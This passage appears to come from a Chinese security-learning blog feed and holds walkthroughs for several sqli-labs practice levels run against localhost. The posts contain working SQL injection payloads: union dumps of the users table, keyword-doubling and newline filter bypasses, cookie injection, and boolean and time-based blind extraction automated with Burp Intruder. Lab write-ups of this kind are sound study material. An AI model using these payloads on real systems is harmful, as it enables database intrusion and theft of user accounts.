<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584935001678.png" alt="1584935001678"></p>
<p>查看users表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584935045339.png" alt="1584935045339"></p>
<p>查看username字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28a&#x2F;?id&#x3D;11111&#39;)  union  %0a  union  selectselect 1,2,group_concat(username)from users  --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3a%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584935073937.png" alt="1584935073937"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十关cookie</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/</url>
    <content><![CDATA[<p>现将带有cookie的GET请求发送的repeater模块，运行，返回这些信息</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578137936.png" alt="1584578137936"></p>
<p>注意，红线地方不能删除等于号之后可以修改，只需要在代码后操作就行，</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578174452.png" alt="1584578174452"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看字段数</span><br><span class="line">&#39; order by 4#</span><br><span class="line">显示没有</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578248087.png" alt="1584578248087"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">试一下3，回显成功表示字段3</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578278709.png" alt="1584578278709"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看注入点，因为是GET请求使用union注入就可以</span><br><span class="line">1&#39; union select 1,2,3#</span><br><span class="line">将uname后面的admin更改成1，如果不更改只能返回一个值，本身uname&#x3D;admin的更改之后就会返回错误，返回更多的值</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578473185.png" alt="1584578473185"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">出现2,3两个注入点，查看当前库</span><br><span class="line">1&#39; union select 1,2,database()#</span><br><span class="line">成功返回</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578512233.png" alt="1584578512233"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看表</span><br><span class="line">1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;&#39;security&#39;#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584578823506.png" alt="1584578823506"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看users表下的字段</span><br><span class="line">1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584579039703.png" alt="1584579039703"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看username字段</span><br><span class="line">1&#39; union select 1,2,group_concat(username)from users#</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3cookie/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584579209464.png" alt="1584579209464"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十五关双写</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/</url>
    <content><![CDATA[<p>先进入25关，页面返回这样</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845399719.png" alt="1584845399719"></p>
<p>按照要求输入ID，页面返回在正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845433730.png" alt="1584845433730"></p>
<p>使用万能单引号测试是否有报错信息</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845487845.png" alt="1584845487845"></p>
<p>页面返回错误，发现后面多了个单引号蛮实用注释符注释一下，页面返回正常</p>
<p>注：在这里不能直接使用#因为并不能注释</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845550173.png" alt="1584845550173"></p>
<p>返回正常，查看当前字段数使用order by 查看</p>
<p>当我们输入3的时候发现order by 只出来了der by 3说明or被过滤了，尝试将or进行双写</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845904257.png" alt="1584845904257"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25&#x2F;?id&#x3D;1&#39; oorrder by 3 --+</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584845985708.png" alt="1584845985708"></p>
<p>查看注入点</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846024505.png" alt="1584846024505"></p>
<p>查看库名</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846043155.png" alt="1584846043155"></p>
<p>查看表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or过滤进行双写</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-25&#x2F;?id&#x3D;-1&#39; union select 1,2,group_concat(table_name)from infoorrmation_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br><span class="line">页面返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846109622.png" alt="1584846109622"></p>
<p>查看users表中字段</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846175918.png" alt="1584846175918"></p>
<p>查看username字段中的数据</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3%E5%8F%8C%E5%86%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584846242646.png" alt="1584846242646"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十八关时间过滤了空格</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/</url>
    <content><![CDATA[<p>这里使用延迟注入</p>
<p>先测试库长度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(length(database())&gt;1,1,sleep(5)  )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当database()大于1的时候，返回时间为2秒，说明正确。</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584894948317.png" alt="1584894948317"></p>
<p>将大于一改为等于1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(length(database())&#x3D;1,1,sleep(5)  )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当数据库长度等于1时返回时间7秒标识错误，说明数据库长度不等于1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584895052245.png" alt="1584895052245"></p>
<p>将字符长度改为8</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(length(database())&#x3D;8,1,sleep(5)  )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">返回时间两秒说明字符长度是8</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584895132736.png" alt="1584895132736"></p>
<p>测试当前数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr(database(),1,1))&#x3D;&#39;115&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">页面返回两秒说明正确，115的ascii对应的是s</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584895481961.png" alt="1584895481961"></p>
<p>尝试其他ascii码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr(database(),1,1))&#x3D;&#39;116&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当ascii等于116时候页面返回7秒说明错误</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584895526600.png" alt="1584895526600"></p>
<p>测试出当前数据库是security</p>
<p>测试security中的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  table_name  %0a  from   %0a  information_schema.tables  %0a  where  %0a   table_schema&#x3D;database()  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;101&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当ascii等于101是返回两秒正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896025344.png" alt="1584896025344"></p>
<p>测试其他ascii码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  table_name  %0a  from   %0a  information_schema.tables  %0a  where  %0a   table_schema&#x3D;database()  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;102&#39;,1,sleep(5) )and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">执行了7秒说明错误</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896070184.png" alt="1584896070184"></p>
<p>得出结果为第一个表示emails</p>
<p>更改limit的值可以查看当前库下的其他表</p>
<h5 id="就以emails为例，查看emails下的字段"><a href="#就以emails为例，查看emails下的字段" class="headerlink" title="就以emails为例，查看emails下的字段"></a>就以emails为例，查看emails下的字段</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  column_name  %0a  from   %0a  information_schema.columns  %0a  where  %0a   table_name&#x3D;&#39;emails&#39;  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;105&#39;,1,sleep(5) ) and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当ascii等于105页面返回两秒说明正确，ascii对应的是i</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896357179.png" alt="1584896357179"></p>
<p>查看错误ascii</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  column_name  %0a  from   %0a  information_schema.columns  %0a  where  %0a   table_name&#x3D;&#39;emails&#39;  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;106&#39;,1,sleep(5) ) and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">将ascii改为106，发现页面返回7秒，说明错误</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896409987.png" alt="1584896409987"></p>
<p>经过测试得出结果为id</p>
<p>查看id字段的数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-28&#x2F;?id&#x3D;1&#39;)%0a %26%26 %0a  if(ascii(substr((select  %0a  id  %0a  from %0a emails  %0a  limit  %0a   0,1),1,1))&#x3D;&#39;49&#39;,1,sleep(5) ) and&#39;1&#39;&#x3D;(&#39;1</span><br><span class="line">当ascii等于49时返回时间两秒正确，ascii对应的是1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896563519.png" alt="1584896563519"></p>
<p>登录mysql查看id是否为1，第一行id确实为1，说明正确</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%E6%97%B6%E9%97%B4%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584896617230.png" alt="1584896617230"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第二十六关a</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3a/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第五关GET盲注</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<h5 id="初始页面"><a href="#初始页面" class="headerlink" title="初始页面"></a>初始页面</h5><p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905377875.png" alt="1583905377875"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们来测试页面报错信息</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39;</span><br><span class="line">这里使用单引号出错了，加上注释符返回成功页面如下。</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905447719.png" alt="1583905447719"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905503272.png" alt="1583905503272"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">因为页面不能返回数据库的信息，所以我们要使用布尔盲注来进行注入</span><br><span class="line">首先要查询当前数据库的长度，在布尔注入中要用and来连接</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and length(database())&#x3D;9--+</span><br><span class="line">我们这里输入9发现错误，并没有返回You are in，我们输入8试一下。</span><br><span class="line">我们输入8之后页面返回乐乐You are in 说明当前数据库长度为8</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905634367.png" alt="1583905634367"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583905687105.png" alt="1583905687105"></p>
<p>知道数据库的长度了我们就要注入出数据库的名称，因为盲注不使用工具的情况下只能手动一个一个尝试，效率太慢，我们用Burp Suite进行抓包，自动筛选。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断库名，我们这里用ascii码来跑，ascii码有上下限，从0-127，等号后面要跟数字，不能跟字母，当然也可以不用ascii吗，substr然后等号后面跟字符串</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;-1&#39; and ascii(substr(database(),1,1))&#x3D;101--+</span><br><span class="line"></span><br><span class="line">我们这两将GET请求发送到 intruder模块下</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583906874787.png" alt="1583906874787"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现将1的位置clear$掉，然后选中101进行Add$</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583906926421.png" alt="1583906926421"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">现在intruder下的payloads在payload type选择Numbers</span><br><span class="line">起始值从0开始结束值到127每次运行间隔1，点击右上角的Start attack，去百度搜索一张ASCII码表，等一下对照</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583906434633.png" alt="1583906434633"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们发现115是s，使用相同手法只需要每次更改database()后面的1的值就行</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583907043000.png" alt="1583907043000"></p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%BA%94%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1583907052698.png" alt="1583907052698"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里我们已经知道他的库名是security，我们要查询表名</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1))&#x3D;101--+</span><br><span class="line">然后继续抓包进行自动扫描</span><br></pre></td></tr></table></figure>

